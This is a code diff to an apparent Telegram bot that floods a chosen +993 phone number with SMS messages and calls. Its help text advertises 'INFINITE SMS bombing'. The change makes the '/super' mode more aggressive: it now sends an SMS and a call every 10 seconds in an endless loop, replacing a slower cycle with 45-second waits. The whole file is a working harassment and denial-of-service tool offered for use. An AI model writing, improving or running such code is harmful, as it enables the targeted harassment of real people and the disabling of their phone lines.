@@ -125,12 +125,12 @@ async function sendSingleCall(phoneNumber: string): Promise<boolean> {
   return await sendPostRequest(callUrl, headers, callData);
 }
 
-// --- 💥 SUPER MODE: Call → 3 SMS (5s apart) → Wait 45s → Repeat ---
+// --- 💥 SUPER MODE: SMS + CALL loop forever ---
 async function runSuper(chatId: string, phoneNumber: string) {
   const key = ["task", chatId];
-  await kv.set(key, { type: "super", phoneNumber, stop: false, cycle: 0, smsCount: 0 });
+  await kv.set(key, { type: "super", phoneNumber, stop: false, cycle: 0 });
 
-  await sendMessage(chatId, `🌀 Starting SUPER mode for +993${phoneNumber}!\n📞 Call → 3 SMS (5s apart) → Wait 45s → Repeat...`);
+  await sendMessage(chatId, `🌀 Starting SUPER mode for +993${phoneNumber}!\n🔁 SMS → Call → Wait 10s → Repeat forever...`);
 
   try {
     let cycle = 0;
@@ -139,10 +139,22 @@ async function runSuper(chatId: string, phoneNumber: string) {
       if (!task.value || task.value.stop) break;
 
       cycle++;
-      await kv.set(key, { ...task.value, cycle, smsCount: 0 });
+      await kv.set(key, { ...task.value, cycle });
 
-      // --- 📞 Send Call FIRST ---
-      await sendMessage(chatId, `📞 Cycle ${cycle}: Sending CALL to +993${phoneNumber}...`);
+      // --- 📤 Send SMS ---
+      await sendMessage(chatId, `📤 Cycle ${cycle}: Sending SMS to +993${phoneNumber}...`);
+      const smsOk = await sendSingleSMS(phoneNumber);
+      if (smsOk) {
+        await sendMessage(chatId, `✅ SMS sent successfully in cycle ${cycle}!`);
+      } else {
+        await sendMessage(chatId, `⚠️ SMS failed in cycle ${cycle}. Continuing...`);
+      }
+
+      const afterSms = await kv.get(key);
+      if (!afterSms.value || afterSms.value.stop) break;
+
+      // --- 📞 Send Call ---
+      await sendMessage(chatId, `📞 Cycle ${cycle}: Sending Call to +993${phoneNumber}...`);
       const callOk = await sendSingleCall(phoneNumber);
       if (callOk) {
         await sendMessage(chatId, `✅ Call sent successfully in cycle ${cycle}!`);
@@ -153,40 +165,9 @@ async function runSuper(chatId: string, phoneNumber: string) {
       const afterCall = await kv.get(key);
       if (!afterCall.value || afterCall.value.stop) break;
 
-      // --- 📤 Send 3 SMS with 5s gap ---
-      await sendMessage(chatId, `📤 Cycle ${cycle}: Sending 3 SMS (5s apart) to +993${phoneNumber}...`);
-
-      for (let i = 1; i <= 3; i++) {
-        const check = await kv.get(key);
-        if (!check.value || check.value.stop) break;
-
-        await kv.set(key, { ...check.value, smsCount: i });
-
-        await sendMessage(chatId, `📤 Cycle ${cycle}, SMS #${i}/3: Sending...`);
-        const smsOk = await sendSingleSMS(phoneNumber);
-
-        if (smsOk) {
-          await sendMessage(chatId, `✅ SMS #${i} sent successfully!`);
-        } else {
-          await sendMessage(chatId, `⚠️ SMS #${i} failed. Continuing...`);
-        }
-
-        const afterSms = await kv.get(key);
-        if (!afterSms.value || afterSms.value.stop) break;
-
-        // Wait 5 seconds after each SMS except the last one
-        if (i < 3) {
-          const waitOk = await sleepInterruptible(5000, chatId);
-          if (!waitOk) break;
-        }
-      }
-
-      const afterBatch = await kv.get(key);
-      if (!afterBatch.value || afterBatch.value.stop) break;
-
-      // --- ⏳ Wait 45 seconds before next cycle ---
-      await sendMessage(chatId, `⏳ Cycle ${cycle} complete. Waiting 45 seconds before next cycle...`);
-      const waitOk = await sleepInterruptible(45000, chatId);
+      // --- ⏳ Wait 10 seconds ---
+      await sendMessage(chatId, `⏳ Cycle ${cycle} complete. Waiting 10 seconds before next cycle...`);
+      const waitOk = await sleepInterruptible(10000, chatId);
       if (!waitOk) break;
     }
   } catch (e) {
@@ -317,7 +298,7 @@ serve(async (req) => {
       "📲 Commands:\n" +
       "• /sms <number> — start INFINITE SMS bombing (3 SMS → 45s wait)\n" +
       "• /call <number> — start sending calls\n" +
-      "• /super <number> — Call → 3 SMS → Wait 45s → Repeat\n" +
+      "• /super <number> — SMS + Call loop forever\n" +
       "• /stop — stop all sending ⛔\n\n" +
       "✨ Created by @Masakoff"
     );
@@ -415,4 +396,3 @@ serve(async (req) => {
     }
   }
 })();
-
